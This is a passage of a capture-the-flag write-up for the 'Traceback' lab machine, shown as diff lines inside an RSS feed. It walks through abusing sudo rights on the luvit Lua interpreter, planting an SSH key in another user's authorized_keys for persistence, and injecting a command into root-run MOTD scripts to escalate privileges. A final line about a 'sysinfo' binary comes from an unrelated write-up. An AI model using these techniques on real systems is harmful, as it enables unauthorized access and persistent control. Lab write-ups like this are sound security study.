-I have left a tool to practice Lua.
-I'm sure you know where to find it.
-Contact me if you have any question.
-</code></pre>
-<!--kg-card-end: markdown--><p>Running <code>sudo -l</code> we realise that the user is able to run the <code>luvit</code> binary as sudo:</p><!--kg-card-begin: markdown--><pre><code>$ sudo -l
-Matching Defaults entries for webadmin on traceback:
-  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User webadmin may run the following commands on traceback:
-  (sysadmin) NOPASSWD: /home/sysadmin/luvit
-```</code></pre>
-<!--kg-card-end: markdown--><p>So, we go to the console interface and run the binary as sudo:</p><!--kg-card-begin: markdown--><pre><code>~ sudo -u sysadmin /home/sysadmin/luvit
-Welcome to the [0mL[0muv[0mit[0m repl!&gt;
-</code></pre>
-<!--kg-card-end: markdown--><p>According to its <a href="https://github.com/develephant/luvit-docs/wiki/repl">documentation</a>, this REPL can run a .lua file passed as an argument. So, we create a .lua file that prints the user flag:</p><pre><code class="language-Lua">print(os.execute("cat /home/sysadmin/user.txt"))</code></pre><p>and then run it as sudo:</p><!--kg-card-begin: markdown--><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p>
-<!--kg-card-end: markdown--><h2 id="gaining-persistency-as-sysadmin">Gaining persistency as sysadmin</h2><p>We start by generating a new RSA key pair:</p><p><code>~ ssh-keygen -t rsa</code><br><br>2. Then we modify the <code>test.lua</code> file we had previously created to add the public key to sysadmin's <code>authorized_keys</code>:</p><pre><code class="language-Lua">os.execute("echo ssh-rsa [PUBLIC_KEY] &gt;&gt; /home/sysadmin/.ssh/authorized_keys")
-</code></pre><p>and run the <code>test.lua</code> file just as before:</p><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p><p>3. Now we can access via SSH.</p><!--kg-card-begin: markdown--><pre><code>~ ssh -i key_rsa sysadmin@traceback.htb
-
-#################################
--------- OWNED BY XH4H ---------
-- I guess stuff could have been configured better ^^ -
-#################################
-
-Welcome to Xh4H land
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-Last login: Sat May 2 03:04:40 2020 from 10.10.14.114
-$
-</code></pre>
-<!--kg-card-end: markdown--><h2 id="getting-root">Getting root</h2><p>Looking at the processes, we see that these operations are occurring periodically:</p><!--kg-card-begin: markdown--><pre><code>$ ps aux
-...
-root                13:41           /usr/sbin/CRON -f
-root                13:41           /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
-root                13:41           sleep 30
-...
-</code></pre>
-<!--kg-card-end: markdown--><p>It seems like there's a 30-second period after the copy operation during which we can modify the files in the <code>/etc/update-motd.d</code> directory, and these modified files will then run as root when a user logs into the system.</p><p>This means we can have the system display the <code>root.txt</code> flag on the greeting message, as such:</p><!--kg-card-begin: markdown--><p><code>$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /etc/update-motd.d/00-header</code></p>
-<!--kg-card-end: markdown--><p>Then we can simply re-authenticate via SSH:</p><!--kg-card-begin: markdown--><pre><code>$ exit
-
-$ ssh -i key_rsa sysadmin@traceback.htb
-#################################
--------- OWNED BY XH4H ---------
-- I guess stuff could have been configured better ^^ -
-#################################
-
-Welcome to Xh4H land
-
-[ROOT_FLAG]
-</code></pre>
-<!--kg-card-end: markdown--><p>Hope you enjoyed it! :)</p>]]></content:encoded></item></channel></rss>
+<!--kg-card-end: markdown--><p>Now, we just need to run the <code>sysinfo</code> binary and in the output there's the root flag instead of the <code>lshw</code> output.</p>]]></content:encoded></item></channel></rss>
